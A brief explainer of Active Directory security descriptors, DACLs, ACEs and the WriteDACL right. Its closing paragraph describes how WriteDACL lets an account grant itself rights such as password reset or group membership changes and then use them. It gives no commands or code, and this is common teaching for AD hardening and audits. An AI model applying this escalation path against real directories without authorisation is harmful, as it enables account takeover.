What's the DACL?

Windows/Active Directory (AD) objects—such as users, groups, computers, OUs, GPOs, and the domain root—have a security descriptor that includes:

  • Owner — the object's owner.
  • DACL (Discretionary ACL) — the permission list that defines who can do what.
  • SACL — auditing rules (log when access occurs).

A DACL consists of multiple ACEs (Access Control Entries).

Each ACE records things like the SID (the principal it applies to), allow/deny, and the specific rights (e.g., GenericAll, GenericWrite, WriteDacl, WriteOwner, ResetPassword, ExtendedRights, …).

What's the WriteDACL?

WriteDACL is the permission to modify an object's DACL.

In practice, it means you can grant yourself (or any account) additional rights on that object—even if you don't currently have those rights. So, even when you can't directly “reset a password” or “add a group member,” you can first edit the DACL to add ACEs that permit those actions, and then perform the action. In other words: grant permission first, act second.
